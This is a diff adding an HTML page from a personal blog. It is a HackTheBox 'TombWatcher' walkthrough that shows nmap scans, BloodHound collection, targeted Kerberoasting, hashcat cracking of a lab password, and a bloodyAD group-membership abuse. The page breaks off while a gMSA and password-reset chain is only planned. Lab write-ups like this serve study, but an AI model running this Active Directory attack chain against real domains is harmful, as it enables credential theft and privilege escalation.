@@ -1,0 +1,2028 @@
+<!DOCTYPE html>
+<html lang="en" class="dark">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0">
+    <meta name="description" content="Kaulik Makwana - Cybersecurity Engineer & Penetration Tester">
+    <title>TombWatcher (HTB) - Walkthrough | Kaulik Makwana</title>
+    
+    <!-- Favicon -->
+    <link rel="icon" type="image/png" href="/assets/images/favicon/favicon.png">
+    
+    <!-- TailwindCSS via CDN -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script>
+        tailwind.config = {
+            darkMode: 'class',
+            theme: {
+                extend: {
+                    colors: {
+                        'cyber-green': '#4ade80',
+                        'cyber-black': '#0a0a0a',
+                        'cyber-gray': '#1a1a1a',
+                    },
+                    animation: {
+                        'terminal-cursor': 'blink 1s step-end infinite',
+                    },
+                    keyframes: {
+                        blink: {
+                            '0%, 100%': { opacity: '1' },
+                            '50%': { opacity: '0' },
+                        }
+                    }
+                }
+            }
+        }
+    </script>
+    
+    <!-- JetBrains Mono Font -->
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600;700&display=swap" rel="stylesheet">
+    
+    <!-- AOS CSS -->
+    <link href="https://unpkg.com/aos@2.3.1/dist/aos.css" rel="stylesheet">
+    
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/assets/css/styles.css">
+    
+    <!-- Prism.js for syntax highlighting -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.24.1/themes/prism-tomorrow.min.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.24.1/prism.min.js"></script>
+    
+    <!-- Marked.js for Markdown rendering -->
+    <script src="https://cdn.jsdelivr.net/npm/marked/marked.min.js"></script>
+    
+    <!-- Alpine.js for interactive tabs -->
+    <script defer src="https://cdn.jsdelivr.net/npm/alpinejs@3.x.x/dist/cdn.min.js"></script>
+    
+    <!-- Custom styles -->
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600;700&display=swap');
+
+        :root {
+            --cyber-black: #111111;
+            --cyber-gray: #1a1a1a;
+            --cyber-green: #4ade80;
+            --animation-timing: cubic-bezier(0.16, 1, 0.3, 1);
+            --animation-quick: 0.2s;
+            --animation-normal: 0.3s;
+            --animation-slow: 0.5s;
+            --spring-timing: cubic-bezier(0.37, 0, 0.63, 1);
+        }
+
+        /* Core styles */
+        body {
+            font-family: 'JetBrains Mono', monospace;
+            background-color: var(--cyber-black);
+            color: #e5e7eb;
+            opacity: 0;
+            animation: fadeIn 0.4s var(--spring-timing) forwards;
+        }
+
+        /* Animation keyframes */
+        @keyframes fadeIn {
+            from { 
+                opacity: 0;
+                transform: translateY(10px);
+            }
+            to { 
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        @keyframes pulseGlow {
+            0% { box-shadow: 0 0 0 0 rgba(74, 222, 128, 0.2); }
+            50% { box-shadow: 0 0 15px 5px rgba(74, 222, 128, 0.1); }
+            100% { box-shadow: 0 0 0 0 rgba(74, 222, 128, 0); }
+        }
+
+        @keyframes terminalCursor {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0; }
+        }
+
+        @keyframes gridPulse {
+            0%, 100% { opacity: 0.3; }
+            50% { opacity: 0.5; }
+        }
+
+        /* Enhanced button animations */
+        .nav-button {
+            position: relative;
+            overflow: hidden;
+            transition: all var(--animation-quick) var(--spring-timing);
+        }
+
+        .nav-button::before {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            width: 100%;
+            height: 100%;
+            background: rgba(74, 222, 128, 0.1);
+            transform: translate(-50%, -50%) scale(0);
+            border-radius: inherit;
+            transition: transform var(--animation-quick) var(--spring-timing);
+        }
+
+        .nav-button:hover::before {
+            transform: translate(-50%, -50%) scale(1);
+        }
+
+        .nav-button:active {
+            transform: scale(0.98);
+        }
+
+        /* Enhanced glass effect */
+        .glass {
+            background: rgba(26, 26, 26, 0.7);
+            backdrop-filter: blur(12px);
+            -webkit-backdrop-filter: blur(12px);
+            border: 1px solid rgba(74, 222, 128, 0.1);
+            transition: all var(--animation-normal) var(--spring-timing);
+        }
+
+        .glass:hover {
+            border-color: rgba(74, 222, 128, 0.2);
+            box-shadow: 0 0 20px rgba(74, 222, 128, 0.1);
+        }
+
+        /* Navigation link animations */
+        .nav-link {
+            position: relative;
+            transition: color var(--animation-quick) var(--spring-timing);
+        }
+
+        .nav-link::after {
+            content: '';
+            position: absolute;
+            bottom: -2px;
+            left: 0;
+            width: 100%;
+            height: 1px;
+            background: var(--cyber-green);
+            transform: scaleX(0);
+            transform-origin: right;
+            transition: transform var(--animation-quick) var(--spring-timing);
+        }
+
+        .nav-link:hover::after {
+            transform: scaleX(1);
+            transform-origin: left;
+        }
+
+        /* Terminal cursor animation */
+        .terminal-cursor {
+            display: inline-block;
+            width: 8px;
+            height: 1em;
+            background: var(--cyber-green);
+            margin-left: 4px;
+            animation: blink 1s step-end infinite;
+            opacity: 0.7;
+            vertical-align: text-bottom;
+        }
+
+        @keyframes blink {
+            0%, 100% { opacity: 0; }
+            50% { opacity: 0.7; }
+        }
+
+        /* Enhanced scroll indicator */
+        .scroll-indicator {
+            position: fixed;
+            top: 0;
+            left: 0;
+            height: 2px;
+            background: linear-gradient(90deg, var(--cyber-green), transparent);
+            z-index: 1000;
+            transform-origin: left;
+            transition: transform var(--animation-quick) var(--spring-timing);
+        }
+
+        /* Mobile Optimizations */
+        @media (max-width: 768px) {
+            .container {
+                padding-left: 1rem;
+                padding-right: 1rem;
+            }
+
+            .mobile-nav {
+                display: none;
+                position: fixed;
+                top: 4rem;
+                left: 0;
+                right: 0;
+                background: rgba(26, 26, 26, 0.95);
+                backdrop-filter: blur(12px);
+                -webkit-backdrop-filter: blur(12px);
+                padding: 1rem;
+                z-index: 50;
+                border-bottom: 1px solid rgba(74, 222, 128, 0.1);
+            }
+
+            .mobile-nav.active {
+                display: block;
+                animation: slideDown 0.2s ease-out;
+            }
+
+            @keyframes slideDown {
+                from {
+                    transform: translateY(-10px);
+                    opacity: 0;
+                }
+                to {
+                    transform: translateY(0);
+                    opacity: 1;
+                }
+            }
+
+            .mobile-nav a {
+                display: block;
+                padding: 0.75rem 1rem;
+                color: #e5e7eb;
+                font-size: 1rem;
+                border-radius: 0.375rem;
+                transition: all 0.2s ease;
+                margin-bottom: 0.5rem;
+                border: 1px solid transparent;
+            }
+
+            .mobile-nav a:hover,
+            .mobile-nav a.active {
+                background: rgba(74, 222, 128, 0.1);
+                border-color: rgba(74, 222, 128, 0.2);
+                color: var(--cyber-green);
+            }
+
+            .menu-button {
+                display: flex;
+                flex-direction: column;
+                justify-content: space-between;
+                width: 24px;
+                height: 20px;
+                padding: 0;
+                background: transparent;
+                border: none;
+                cursor: pointer;
+            }
+
+            .menu-button span {
+                display: block;
+                width: 100%;
+                height: 2px;
+                background: var(--cyber-green);
+                transition: all 0.2s ease;
+            }
+
+            .menu-button.active span:nth-child(1) {
+                transform: translateY(9px) rotate(45deg);
+            }
+
+            .menu-button.active span:nth-child(2) {
+                opacity: 0;
+            }
+
+            .menu-button.active span:nth-child(3) {
+                transform: translateY(-9px) rotate(-45deg);
+            }
+
+            /* Typography Adjustments */
+            h1 { font-size: 1.875rem !important; }
+            h2 { font-size: 1.5rem !important; }
+            h3 { font-size: 1.25rem !important; }
+
+            /* Content Spacing */
+            .content-wrapper {
+                padding-top: 1rem;
+            }
+
+            /* Navigation Adjustments */
+            .nav-link {
+                padding: 0.5rem;
+            }
+
+            /* Button Adjustments */
+            .btn {
+                padding: 0.5rem 1rem;
+                font-size: 0.875rem;
+            }
+        }
+
+        /* Preserve Desktop Styles */
+        @media (min-width: 769px) {
+            .menu-button {
+                display: none;
+            }
+
+            .mobile-nav {
+                display: none;
+            }
+        }
+
+        /* Safe Area Insets */
+        @supports(padding: max(0px)) {
+            .container {
+                padding-left: max(1rem, env(safe-area-inset-left));
+                padding-right: max(1rem, env(safe-area-inset-right));
+            }
+
+            .mobile-nav {
+                padding-bottom: max(1rem, env(safe-area-inset-bottom));
+            }
+        }
+
+        /* Markdown Content Styles */
+        .markdown-content ul {
+            list-style-type: none;
+            padding-left: 1.75rem;
+            margin: 1rem 0;
+        }
+
+        .markdown-content ul > li {
+            position: relative;
+            margin: 0.5rem 0;
+            padding-left: 0.5rem;
+        }
+
+        .markdown-content ul > li::before {
+            content: ">";
+            position: absolute;
+            left: -1.5rem;
+            color: var(--cyber-green);
+            opacity: 0.8;
+            font-family: 'JetBrains Mono', monospace;
+        }
+
+        .markdown-content ul > li > ul {
+            margin-top: 0.5rem;
+            margin-bottom: 0.5rem;
+        }
+
+        .markdown-content ul > li > ul > li::before {
+            content: "-";
+        }
+
+        .markdown-content ol {
+            counter-reset: section;
+            list-style-type: none;
+            padding-left: 2.5rem;
+            margin: 1rem 0;
+        }
+
+        .markdown-content ol > li {
+            counter-increment: section;
+            position: relative;
+            margin: 0.75rem 0;
+            padding-left: 0.5rem;
+        }
+
+        .markdown-content ol > li::before {
+            content: counter(section) ".";
+            position: absolute;
+            left: -2.5rem;
+            width: 2rem;
+            text-align: right;
+            color: var(--cyber-green);
+            font-weight: 500;
+            font-family: 'JetBrains Mono', monospace;
+        }
+
+        .markdown-content ol > li > ol {
+            counter-reset: subsection;
+            margin-top: 0.5rem;
+            margin-bottom: 0.5rem;
+        }
+
+        .markdown-content ol > li > ol > li {
+            counter-increment: subsection;
+            margin: 0.5rem 0;
+        }
+
+        .markdown-content ol > li > ol > li::before {
+            content: counter(section) "." counter(subsection);
+        }
+
+        /* Table Styles */
+        .markdown-content table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 1.5rem 0;
+            background: rgba(26, 26, 26, 0.7);
+            backdrop-filter: blur(12px);
+            -webkit-backdrop-filter: blur(12px);
+            border: 1px solid rgba(74, 222, 128, 0.1);
+            border-radius: 0.5rem;
+            overflow-x: auto;
+            display: block;
+        }
+
+        .markdown-content th {
+            background: rgba(55, 65, 81, 0.5);
+            text-align: left;
+            padding: 0.75rem 1rem;
+            font-weight: 600;
+            border-bottom: 1px solid rgba(74, 222, 128, 0.1);
+            color: var(--cyber-green);
+            white-space: nowrap;
+        }
+
+        .markdown-content td {
+            padding: 0.75rem 1rem;
+            border-bottom: 1px solid rgba(74, 222, 128, 0.1);
+            min-width: 100px;
+        }
+
+        .markdown-content tr:hover {
+            background: rgba(74, 222, 128, 0.05);
+            transition: background-color 0.2s;
+        }
+
+        @media (max-width: 768px) {
+            .markdown-content table {
+                margin: 1rem -1rem;
+                border-radius: 0;
+            }
+
+            .markdown-content th,
+            .markdown-content td {
+                padding: 0.5rem 0.75rem;
+            }
+
+            .markdown-content ul {
+                padding-left: 1.5rem;
+            }
+
+            .markdown-content ol {
+                padding-left: 2rem;
+            }
+
+            .markdown-content ul > li::before {
+                left: -1.25rem;
+            }
+
+            .markdown-content ol > li::before {
+                left: -2rem;
+                width: 1.75rem;
+            }
+        }
+    </style>
+    <!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>TombWatcher (HTB) - Walkthrough | Kaulik Makwana</title>
+<meta name="generator" content="Jekyll v3.10.0" />
+<meta property="og:title" content="TombWatcher (HTB) - Walkthrough" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Overview" />
+<meta property="og:description" content="Overview" />
+<link rel="canonical" href="https://kaulikmakwana.github.io/writeups/hackthebox/TombWatcher-Hackthebox-Walkthrough/" />
+<meta property="og:url" content="https://kaulikmakwana.github.io/writeups/hackthebox/TombWatcher-Hackthebox-Walkthrough/" />
+<meta property="og:site_name" content="Kaulik Makwana" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2025-07-25T00:00:00+00:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="TombWatcher (HTB) - Walkthrough" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2025-07-25T00:00:00+00:00","datePublished":"2025-07-25T00:00:00+00:00","description":"Overview","headline":"TombWatcher (HTB) - Walkthrough","mainEntityOfPage":{"@type":"WebPage","@id":"https://kaulikmakwana.github.io/writeups/hackthebox/TombWatcher-Hackthebox-Walkthrough/"},"url":"https://kaulikmakwana.github.io/writeups/hackthebox/TombWatcher-Hackthebox-Walkthrough/"}</script>
+<!-- End Jekyll SEO tag -->
+
+<style>
+.certificate-key { color: #e6b800 !important; font-weight: 600; }
+.certificate-value { color: #39ff14 !important; font-weight: 500; }
+</style>
+</head>
+<body class="min-h-screen flex flex-col bg-gradient-to-b from-cyber-black to-cyber-gray">
+    <!-- Scroll Progress Indicator -->
+    <div class="scroll-indicator"></div>
+
+    <!-- Navigation -->
+    <nav class="fixed w-full top-0 glass z-50">
+        <div class="max-w-6xl mx-auto px-4">
+            <div class="flex justify-between items-center h-16">
+                <a href="/" class="group flex items-center space-x-2">
+                    <span class="text-xl font-bold text-cyber-green">[KM]</span>
+                    <span class="hidden md:inline text-sm text-gray-400 group-hover:text-cyber-green transition-colors">~/Red Teamer</span>
+                    
+                </a>
+                
+                <!-- Desktop Navigation -->
+                <div class="hidden md:flex space-x-6">
+                    <a href="/" class="nav-link ">~/home</a>
+                    <a href="/about" class="nav-link ">~/about</a>
+                    <a href="/writeups" class="nav-link active text-cyber-green">~/writeups</a>
+                    <a href="/learnings" class="nav-link ">~/learnings</a>
+                </div>
+
+                <!-- Mobile Menu Button -->
+                <button class="md:hidden menu-button" id="menuButton" aria-label="Toggle menu">
+                    <span></span>
+                    <span></span>
+                    <span></span>
+                </button>
+            </div>
+        </div>
+
+        <!-- Mobile Navigation -->
+        <div class="mobile-nav md:hidden" id="mobileNav">
+            <a href="/" class="">~/home</a>
+            <a href="/about" class="">~/about</a>
+            <a href="/writeups" class="active">~/writeups</a>
+            <a href="/learnings" class="">~/learnings</a>
+        </div>
+    </nav>
+
+    <!-- Main Content -->
+    <main class="flex-grow pt-16">
+        <link href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css" rel="stylesheet" />
+<link href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/plugins/line-numbers/prism-line-numbers.min.css" rel="stylesheet" />
+
+<!-- Main Container with Border (matches home page) -->
+<article class="min-h-screen relative py-6 md:py-12">
+    <div class="absolute inset-0 bg-[linear-gradient(rgba(26,26,26,0.5)_2px,transparent_2px),linear-gradient(90deg,rgba(26,26,26,0.5)_2px,transparent_2px)] bg-[size:50px_50px] [mask-image:radial-gradient(ellipse_80%_80%_at_50%_50%,black,transparent)]"></div>
+    <div class="max-w-7xl mx-auto px-2 sm:px-4 relative">
+        <div class="glass border border-cyber-green/10 rounded-2xl p-4 sm:p-8 flex flex-col min-h-[60vh] justify-center">
+            <!-- Back to Writeups Link -->
+            <div class="mb-3 sm:mb-4 md:mb-6 lg:mb-8 w-full" data-aos="fade-right" data-aos-delay="200">
+                <a href="/writeups" class="group inline-flex items-center justify-center bg-cyber-black/50 text-cyber-green px-3 py-2 sm:px-4 sm:py-2.5 rounded-lg hover:bg-cyber-black/70 transition-all duration-300 border border-cyber-green/20 hover:border-cyber-green/40 text-xs sm:text-sm">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="h-3.5 w-3.5 sm:h-4 sm:w-4 mr-1.5 sm:mr-2 transform group-hover:-translate-x-1 transition-transform duration-300" viewBox="0 0 20 20" fill="currentColor">
+                        <path fill-rule="evenodd" d="M9.707 16.707a1 1 0 01-1.414 0l-6-6a1 1 0 010-1.414l6-6a1 1 0 011.414 1.414L5.414 9H17a1 1 0 110 2H5.414l4.293 4.293a1 1 0 010 1.414z" clip-rule="evenodd" />
+                    </svg>
+                    <span class="font-mono">cd ../writeups</span>
+                </a>
+            </div>
+
+            <header class="mb-4 sm:mb-6 md:mb-8 lg:mb-10 w-full">
+                <h1 class="terminal-title text-3xl sm:text-4xl md:text-5xl font-bold mb-6 sm:mb-8 tracking-tight text-cyber-green">TombWatcher (HTB) - Walkthrough</h1>
+                <div class="text-gray-400 mt-1.5 sm:mt-2 font-mono text-xs sm:text-sm" data-aos="fade-up" data-aos-delay="800">
+                    
+                        <span class="text-cyber-green">></span> July 25, 2025
+                        
+                        <span class="text-cyber-green mx-2">|</span> <span class="text-cyber-green">HackTheBox</span>
+                        
+                    
+                </div>
+            </header>
+
+            <div class="markdown-content prose prose-invert max-w-none font-mono text-xs sm:text-sm w-full" data-aos="fade-up" data-aos-delay="1000">
+                <style>
+                    .markdown-content h2 {
+                        @apply terminal-title text-2xl sm:text-3xl font-bold mt-8 mb-4 text-cyber-green;
+                    }
+                    .markdown-content h3 {
+                        @apply terminal-text text-xl sm:text-2xl font-semibold mt-6 mb-3 text-cyber-green;
+                    }
+                </style>
+                <h1 id="section-overview">Overview</h1>
+
+<p>Abuse AD misconfiguration and  ESC15 Vulnerability</p>
+
+<hr />
+<h2 id="section-initial-credentials">initial credentials</h2>
+<p>-&gt;  we have been provided initial credentials 
+	- user : henry 
+	- pass : H3nry_987TGV!</p>
+
+<hr />
+<h1 id="section-enumeration">Enumeration</h1>
+<h2 id="section-port-scan">Port scan</h2>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nmap <span class="nt">--min-rate</span> 10000 <span class="nt">-Pn</span> <span class="nt">-p-</span> <span class="nt">-v</span> <span class="nt">-oN</span> open_ports 10.10.11.72
+	PORT      STATE SERVICE
+	53/tcp    open  domain
+	80/tcp    open  http
+	135/tcp   open  msrpc
+	139/tcp   open  netbios-ssn
+	389/tcp   open  ldap
+	445/tcp   open  microsoft-ds
+	464/tcp   open  kpasswd5
+	593/tcp   open  http-rpc-epmap
+	636/tcp   open  ldapssl
+	3268/tcp  open  globalcatLDAP
+	3269/tcp  open  globalcatLDAPssl
+	5985/tcp  open  wsman
+	9389/tcp  open  adws
+	49666/tcp open  unknown
+	49693/tcp open  unknown
+	49694/tcp open  unknown
+	49696/tcp open  unknown
+	49714/tcp open  unknown
+	49720/tcp open  unknown
+</code></pre></div></div>
+
+<h2 id="section-full-scan">full scan</h2>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-sSCV</span> <span class="nt">-Pn</span> <span class="nt">-T4</span> <span class="nt">-v</span> <span class="nv">$ip</span> <span class="nt">-oN</span> nmap_scan 
+	Nmap scan report <span class="k">for </span>tombwatcher.htb <span class="o">(</span>10.10.11.72<span class="o">)</span>
+	Host is up <span class="o">(</span>3.3s latency<span class="o">)</span><span class="nb">.</span>
+	Not shown: 987 filtered tcp ports <span class="o">(</span>no-response<span class="o">)</span>
+	PORT     STATE SERVICE           VERSION
+	53/tcp   open  domain            Simple DNS Plus
+	80/tcp   open  http              Microsoft IIS httpd 10.0
+	|_http-server-header: Microsoft-IIS/10.0
+	| http-methods: 
+	|   Supported Methods: OPTIONS TRACE GET HEAD POST
+	|_  Potentially risky methods: TRACE
+	|_http-title: IIS Windows Server
+	88/tcp   open  kerberos-sec      Microsoft Windows Kerberos <span class="o">(</span>server <span class="nb">time</span>: 2025-09-03 11:17:20Z<span class="o">)</span>
+	135/tcp  open  msrpc             Microsoft Windows RPC
+	139/tcp  open  netbios-ssn       Microsoft Windows netbios-ssn
+	389/tcp  open  ldap              Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: tombwatcher.htb0., Site: Default-First-Site-Name<span class="o">)</span>
+	| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>DC01.tombwatcher.htb
+	| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:DC01.tombwatcher.htb
+	| Issuer: <span class="nv">commonName</span><span class="o">=</span>tombwatcher-CA-1
+	| Public Key <span class="nb">type</span>: rsa
+	| Public Key bits: 2048
+	| Signature Algorithm: sha1WithRSAEncryption
+	| Not valid before: 2024-11-16T00:47:59
+	| Not valid after:  2025-11-16T00:47:59
+	| MD5:   a396:4dc0:104d:3c58:54e0:19e3:c2ae:0666
+	|_SHA-1: fe5e:76e2:d528:4a33:8adf:c84e:92e3:900e:4234:ef9c
+	|_ssl-date: 2025-09-03T11:18:38+00:00<span class="p">;</span> +3h34m41s from scanner time.
+	445/tcp  open  microsoft-ds?
+	464/tcp  open  kpasswd5?
+	593/tcp  open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
+	636/tcp  open  ssl/ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: tombwatcher.htb0., Site: Default-First-Site-Name<span class="o">)</span>
+	| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>DC01.tombwatcher.htb
+	| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:DC01.tombwatcher.htb
+	| Issuer: <span class="nv">commonName</span><span class="o">=</span>tombwatcher-CA-1
+	| Public Key <span class="nb">type</span>: rsa
+	| Public Key bits: 2048
+	| Signature Algorithm: sha1WithRSAEncryption
+	| Not valid before: 2024-11-16T00:47:59
+	| Not valid after:  2025-11-16T00:47:59
+	| MD5:   a396:4dc0:104d:3c58:54e0:19e3:c2ae:0666
+	|_SHA-1: fe5e:76e2:d528:4a33:8adf:c84e:92e3:900e:4234:ef9c
+	|_ssl-date: 2025-09-03T11:18:31+00:00<span class="p">;</span> +3h34m41s from scanner time.
+	3268/tcp open  ldap              Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: tombwatcher.htb0., Site: Default-First-Site-Name<span class="o">)</span>
+	|_ssl-date: 2025-09-03T11:18:33+00:00<span class="p">;</span> +3h34m36s from scanner time.
+	| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>DC01.tombwatcher.htb
+	| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:DC01.tombwatcher.htb
+	| Issuer: <span class="nv">commonName</span><span class="o">=</span>tombwatcher-CA-1
+	| Public Key <span class="nb">type</span>: rsa
+	| Public Key bits: 2048
+	| Signature Algorithm: sha1WithRSAEncryption
+	| Not valid before: 2024-11-16T00:47:59
+	| Not valid after:  2025-11-16T00:47:59
+	| MD5:   a396:4dc0:104d:3c58:54e0:19e3:c2ae:0666
+	|_SHA-1: fe5e:76e2:d528:4a33:8adf:c84e:92e3:900e:4234:ef9c
+	3269/tcp open  globalcatLDAPssl?
+	|_ssl-date: 2025-09-03T11:18:31+00:00<span class="p">;</span> +3h34m41s from scanner time.
+	| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>DC01.tombwatcher.htb
+	| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:DC01.tombwatcher.htb
+	| Issuer: <span class="nv">commonName</span><span class="o">=</span>tombwatcher-CA-1
+	| Public Key <span class="nb">type</span>: rsa
+	| Public Key bits: 2048
+	| Signature Algorithm: sha1WithRSAEncryption
+	| Not valid before: 2024-11-16T00:47:59
+	| Not valid after:  2025-11-16T00:47:59
+	| MD5:   a396:4dc0:104d:3c58:54e0:19e3:c2ae:0666
+	|_SHA-1: fe5e:76e2:d528:4a33:8adf:c84e:92e3:900e:4234:ef9c
+	5985/tcp open  http              Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
+	|_http-title: Not Found
+	|_http-server-header: Microsoft-HTTPAPI/2.0
+	Service Info: Host: DC01<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
+	
+	Host script results:
+	|_clock-skew: mean: 3h34m38s, deviation: 2s, median: 3h34m39s
+	| smb2-security-mode: 
+	|   3:1:1: 
+	|_    Message signing enabled and required
+	| smb2-time: 
+	|   <span class="nb">date</span>: 2025-09-03T11:17:52
+	|_  start_date: N/A
+</code></pre></div></div>
+
+<ul>
+  <li>
+    <h2 id="section-on-port-80-nothing-usefull-so-moved-to-ad">on port 80 nothing usefull so moved to AD</h2>
+    <h2 id="section--ad-enumeration">🌐 AD enumeration</h2>
+    <h3 id="section--user-enumeration">👥 user enumeration</h3>
+    <p>```shell
+$ nxc ldap $ip -u $user1 -p $pass1 –users –users-export AD_users 
+  Administrator
+  Guest
+  krbtgt
+  Henry
+  Alfred
+  sam
+  john</p>
+  </li>
+</ul>
+
+<h1 id="section-dcdomain-controller--dc01tombwatcherhtb--10101172">DC(domain controller) : DC01.tombwatcher.htb = 10.10.11.72</h1>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+---
+### bloodhounud time
+
+```shell
+bloodhound-python -d TOMBWATCHER.HTB -u henry -p 'H3nry_987TGV!' -gc dc01.tombwatcher.htb -c all -ns 10.10.11.72                                          ─╯
+INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
+INFO: Found AD domain: tombwatcher.htb
+INFO: Getting TGT for user
+WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (dc01.tombwatcher.htb:88)] [Errno -2] Name or service not known
+INFO: Connecting to LDAP server: dc01.tombwatcher.htb
+INFO: Found 1 domains
+INFO: Found 1 domains in the forest
+INFO: Found 1 computers
+INFO: Connecting to LDAP server: dc01.tombwatcher.htb
+INFO: Found 9 users
+INFO: Found 53 groups
+INFO: Found 2 gpos
+INFO: Found 2 ous
+INFO: Found 19 containers
+INFO: Found 0 trusts
+INFO: Starting computer enumeration with 10 workers
+INFO: Querying computer: DC01.tombwatcher.htb
+INFO: Done in 01M 46S
+</code></pre></div></div>
+
+<p>![[Screenshot From 2025-09-03 17-02-26.png]]</p>
+
+<p>![[Screenshot From 2025-09-03 17-27-49.png]]</p>
+
+<p>Observed relationships that :  the user <strong>Henry</strong> has “WriteSPN (Service Pricipal Name)” to the user Alfred and  another one is to  user <strong>“JOHN”</strong>, who has remote access privileges.</p>
+
+<ul>
+  <li>first we will exploit WriteSPN which is called Targeted Kerberoasting.
+    <ul>
+      <li>one tool i found on github :  <a href="https://github.com/ShutdownRepo/targetedKerberoast?tab=readme-ov-file">targetedKerberoast.py</a></li>
+    </ul>
+
+    <blockquote>
+      <p>First i try with FQDN : DC01.tombwatcher.htb which did not work so changed with tombwatcher.htb and it worked but got ‘Clock skew too great’ so to fix this issues use faketime utility to pass correct command.</p>
+    </blockquote>
+  </li>
+</ul>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># time sync -&gt; faketime -&gt; command = Alfred hash</span>
+
+<span class="nv">$ </span>net <span class="nb">time</span> <span class="nt">-S</span>  10.10.11.72 
+<span class="c"># copy time</span>
+faketime <span class="s1">'Thu Sep  4 16:02:03 2025'</span> python targetedKerberoast.py <span class="nt">-d</span> tombwatcher.htb <span class="nt">-u</span> henry <span class="nt">-p</span> <span class="s1">'H3nry_987TGV!'</span> <span class="nt">--dc-ip</span> 10.10.11.72 
+	<span class="o">[</span><span class="k">*</span><span class="o">]</span> Starting kerberoast attacks
+	<span class="o">[</span><span class="k">*</span><span class="o">]</span> Fetching usernames from Active Directory with LDAP
+	<span class="o">[</span>+] Printing <span class="nb">hash </span><span class="k">for</span> <span class="o">(</span>Alfred<span class="o">)</span>
+	<span class="nv">$krb5tgs$23$*</span>Alfred<span class="nv">$TOMBWATCHER</span>.......
+</code></pre></div></div>
+
+<h4 id="section-time-to-crack-hash">time to crack hash</h4>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>hashcat <span class="nt">-m</span> 13100 Alfred_hash /usr/share/wordlists/rockyou.txt  
+<span class="c"># got password </span>
+Alfred: basketball
+
+<span class="c"># to varify ; use nxc (netexec)</span>
+<span class="nv">$ </span>nxc ldap <span class="nv">$ip</span> <span class="nt">-u</span> Alfred <span class="nt">-p</span> basketball
+
+LDAP        10.10.11.72     389    DC01             <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10 / Server 2019 Build 17763 <span class="o">(</span>name:DC01<span class="o">)</span> <span class="o">(</span>domain:tombwatcher.htb<span class="o">)</span>
+LDAP        10.10.11.72     389    DC01             <span class="o">[</span>+] tombwatcher.htb<span class="se">\A</span>lfred:basketball
+
+</code></pre></div></div>
+
+<p>again  coming back to bloodhound and enumerating user alfred ; found that user  has the ability to add itself, to the group INFRASTRUCTURE and then gain the same privileges that INFRASTRUCTURE has.</p>
+
+<p>![[Screenshot From 2025-09-04 12-53-39.png]]</p>
+
+<p>![[Screenshot From 2025-09-04 13-11-09.png]]</p>
+
+<p>![[Screenshot From 2025-09-04 13-12-14.png]]</p>
+
+<ul>
+  <li>Now Alfred has ability to add itself to the group infrastructure and can be gain same privileges that group has .</li>
+  <li>infrastructure has <strong>ReadGMSAPassword</strong> permission that can be abused to gain ansible_dev$ ntlm hash .</li>
+  <li>now ansible_dev$ has <strong>ForceChangePassword</strong> permission to user SAM and we can abused it also.</li>
+</ul>
+
+<p>so attack flow will be <code class="language-plaintext highlighter-rouge">adding alfred to infrastructure group &gt; geting ansible_dev$ ntlm hash &gt; change user SAM password</code></p>
+
+<h3 id="section-adding-alfred-to-infrastructure-group">adding alfred to infrastructure group</h3>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>bloodyAD <span class="nt">--host</span> <span class="nv">$ip</span> <span class="nt">-d</span> <span class="s1">'tombwatcher.htb'</span> <span class="nt">-u</span> <span class="nv">$user2</span> <span class="nt">-p</span> <span class="nv">$pass2</span> add groupMember <span class="s2">"INFRASTRUCTURE"</span> <span class="nv">$user2</span>  
+<span class="o">[</span>+] Alfred added to INFRASTRUCTURE
+</code></pre></div></div>
+
